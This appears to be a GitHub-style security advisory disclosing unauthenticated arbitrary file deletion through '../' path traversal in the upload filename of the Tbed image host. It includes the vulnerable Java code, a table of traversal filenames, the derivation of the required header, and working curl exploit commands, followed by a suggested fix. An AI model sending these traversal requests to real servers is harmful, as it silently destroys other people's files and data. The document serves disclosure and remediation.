https://github.com/Hello-hao/Tbed/

# Unauthenticated arbitrary file deletion through path traversal in the upload filename (CWE-22)

### Version
Confirmed on commit `86987221123931366efbf79b9b029180ddcf52e4` (pom version 2.0-Free).

## Disclosure

 - 15 Nov 2026 - no usable reporting channel found: the repository has issues disabled, private vulnerability reporting off, no SECURITY.md, no discussions, and the README lists no security contact. The project homepage (tbed.hellohao.cn) returned an empty response when checked.
 - 15 Nov 2026 - disclosed here, since the maintainer cannot be reached through GitHub

## Summary

`SetFiles.changeFile_new` (`src/main/java/cn/hellohao/utils/SetFiles.java`) builds a temp file path from the client-supplied multipart filename with no normalization:

```java
String fileName = multipartFile.getOriginalFilename();
String prefix = fileName.substring(fileName.lastIndexOf("."));
String new_FileName = System.getProperty("java.io.tmpdir")+"hellohao_tmp_upload"+File.separator+fileName;
file = new File(new_FileName);
FileUtils.copyInputStreamToFile(multipartFile.getInputStream(), file);
```

`../` in the filename escapes the temp directory. The upload handler (`IndexController.upimg`, `POST /upload`) calls this before any upload-permission check, and `UploadServicel.uploadForLoc` then calls `file.delete()` on the same path in every outcome (rejected, failed or finished). An unauthenticated request can therefore overwrite and then delete any file the server process can write. The default configuration (guest upload disabled) is enough, because the guest-disabled rejection also runs `file.delete()` on the traversed path.

## Details

POST requests other than `/api`, `/client` and `/verifyCode` must carry the header `usersOrigin` equal to the md5 of the configured front-end origin (`HELLOHAO_WEB_HOST`, default `http://127.0.0.1:8080`). This is the value the project's own front end sends with every POST, so any visitor of the site can obtain it. The front end is not in this repository, so the header derivation is inferred from the filter code.

The same helper is also called from `ClientService` and `ClientAppController` (`/imgUpload`).

Filename variants tested (oracle: was the target deleted):

| Filename | Target deleted |
|---|---|
| `../fz/a.txt` | yes |
| `../../fz/b.txt` | yes |
| `./../fz/g.png` | yes |
| `../fz/f` | yes |
| `..%2ffz/c.txt` | no |
| `/fz/d.txt` | no |
| `..\fz\e.txt` | no |
| `....//fz/h.txt` | no |
| `fz/i.txt` | no |

The temp directory resolves to `/tmphellohao_tmp_upload/`, because `java.io.tmpdir` has no trailing separator, so `../x` resolves under `/`.

## Steps To Reproduce

Environment: upstream `sql/tbed.sql` loaded into mysql:8.0 (`--innodb-strict-mode=0 --sql-mode=`), redis:7, the app built with `mvn -DskipTests package` (maven:3.8.6-openjdk-8) and run with `java -jar` on eclipse-temurin:8-jre, published on 127.0.0.1:18088. Environment variables: `MYSQL_URL=jdbc:mysql://db:3306/tbed?...`, `SPRING_REDIS_HOST=redis`. No other configuration; guest upload stays at its default (disabled).

1. Create three files inside the container: `/tmp/victim_ctl.txt`, `/tmp/victim_r58.txt` and `/HellohaoData/keep/precious.txt`.
2. Compute the header value: `MD5=$(printf 'http://127.0.0.1:8080' | md5sum | cut -d' ' -f1)`
3. Control (plain filename):
   `printf x | curl -s -H "usersOrigin: $MD5" -F "file=@-;filename=victim_ctl.txt;type=image/png" -F day=1 http://127.0.0.1:18088/upload`
   Response: `{"code":"1000","info":"系统已禁用游客上传",...}` (guest upload disabled). `/tmp/victim_ctl.txt` still exists.
4. Exploit:
   `printf x | curl -s -H "usersOrigin: $MD5" -F "file=@-;filename=../tmp/victim_r58.txt;type=image/png" -F day=1 http://127.0.0.1:18088/upload`
   `printf x | curl -s -H "usersOrigin: $MD5" -F "file=@-;filename=../HellohaoData/keep/precious.txt;type=image/png" -F day=1 http://127.0.0.1:18088/upload`
   Both return the same code 1000 body. Afterwards `/tmp/victim_r58.txt` and `/HellohaoData/keep/precious.txt` are gone and `/tmp/victim_ctl.txt` remains.
5. Control without the header: the same exploit request without `usersOrigin` returns `{"code":"500","info":"未知错误"}` and the target survives.

A second tester, starting from the same environment with its own victim files in five directories, reproduced the deletion and the two controls.

## Impact

An anonymous client deleted a pre-existing file outside the upload directory and a file in an application data directory. The server replied "guest upload disabled" (code 1000) in every case, so the deletion is silent from the client side. The impact is arbitrary file deletion as the application user (root in the test container), which can take down the application or destroy stored data.

Not claimed: persistence of attacker-chosen content (on `/upload` the written file is deleted by the same request) and code execution. A different endpoint (`/api/uploadbymail`) left content in place after an error in the test storage setup, but it needs the API enabled (off by default) and valid credentials, so it is not part of this finding.

CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (7.5), CWE-22 / CWE-73.

## Suggested fix

Use only the base name of the uploaded file (`Paths.get(fileName).getFileName()`), or generate a random temp name and keep the original name as metadata. Additionally verify that `file.getCanonicalPath()` starts with the canonical path of the temp directory before writing or deleting.
